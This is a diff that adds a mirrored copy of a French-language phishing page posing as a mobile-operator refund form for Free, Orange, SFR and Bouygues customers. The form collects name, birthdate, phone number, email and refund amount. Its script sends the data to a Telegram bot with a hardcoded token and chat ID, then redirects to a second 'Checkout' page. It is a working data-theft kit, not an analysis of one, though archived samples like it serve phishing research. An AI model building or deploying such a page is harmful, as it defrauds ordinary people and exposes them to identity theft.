@@ -1,0 +1,95 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+
+<!-- Mirrored from remboursement.suivilivraison.shop/order_confirmation/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 06 Mar 2025 17:12:57 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire de remboursement</title>
+    <link rel="stylesheet" href="https://rembourse.space/fr/styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header-image">
+            <img src="https://files.catbox.moe/o0f34s.png" alt="Euro Rebate Icon">
+        </div>
+        <h1>Formulaire de remboursement</h1>
+        <p>Sélectionnez votre opérateur mobile :</p>
+        <div class="operators">
+            <label>
+                <input type="radio" name="operator" value="free" required>
+                <img src="https://www.zoneadsl.com/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2Fdwb5rz3t%2Fproduction%2F751bb27e3e1fe67dbb6909cab7a31e5cda694217-600x400.png%3Fw%3D960&amp;w=3840&amp;q=75" alt="Free Mobile">
+            </label>
+            <label>
+                <input type="radio" name="operator" value="orange" required>
+                <img src="https://files.catbox.moe/lqa2di.png" alt="Orange">
+            </label>
+            <label>
+                <input type="radio" name="operator" value="sfr" required>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/9/97/SFR-2022-logo.svg" alt="SFR">
+            </label>
+            <label>
+                <input type="radio" name="operator" value="bouygues" required>
+                <img src="https://files.catbox.moe/c1qc4t.png" alt="Bouygues Telecom">
+            </label>
+        </div>
+        <form id="refundForm" onsubmit="submitForm(event)">
+            <input type="text" name="name" placeholder="Nom et prénom" required>
+            
+            <label for="birthdate" class="date-label">Date de naissance :</label>
+            <input type="date" id="birthdate" name="birthdate" placeholder="jj/mm/aaaa" required>
+            
+            <input type="tel" name="phone" placeholder="Numéro de téléphone" required>
+            <input type="email" name="email" placeholder="Adresse mail" required>
+            <input type="number" name="refund_amount" placeholder="Montant de remboursement en €" required>
+            <button type="submit">Suivant</button>
+        </form>
+    </div>
+
+    <script>
+        function submitForm(event) {
+            event.preventDefault(); // Empêche l'envoi par défaut du formulaire
+
+            const form = document.getElementById('refundForm');
+            const formData = new FormData(form);
+
+            const name = formData.get('name');
+            const birthdate = formData.get('birthdate');
+            const phone = formData.get('phone');
+            const email = formData.get('email');
+            const operator = formData.get('operator');
+            const refundAmount = formData.get('refund_amount');
+
+            const message = `Nouvelle demande ❤️\n\nNom et prénom 👤: ${name}\nDate de naissance 👤: ${birthdate}\nTel 📞: ${phone}\nEmail 📩: ${email}\nOpérateur: ${operator}\nMontant de remboursement 💶: ${refundAmount} €`;
+
+            const token = '7689162461:AAFb37q7_EokbVMQkfTf9FSvl5TO3iC2bIs'; // Votre bot token
+            const chatId = '6157041316'; // Votre chat ID
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(response => {
+                if (response.ok) {
+                    window.location.href = 'Checkout.html'; // Redirige vers la 2ème page
+                } else {
+                    alert('Une erreur est survenue lors de l\'envoi des données. Veuillez réessayer.');
+                }
+            }).catch(error => {
+                console.error('Erreur:', error);
+                alert('Une erreur est survenue lors de l\'envoi des données. Veuillez réessayer.');
+            });
+        }
+    </script>
+</body>
+
+<!-- Mirrored from remboursement.suivilivraison.shop/order_confirmation/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 06 Mar 2025 17:13:01 GMT -->
+</html>
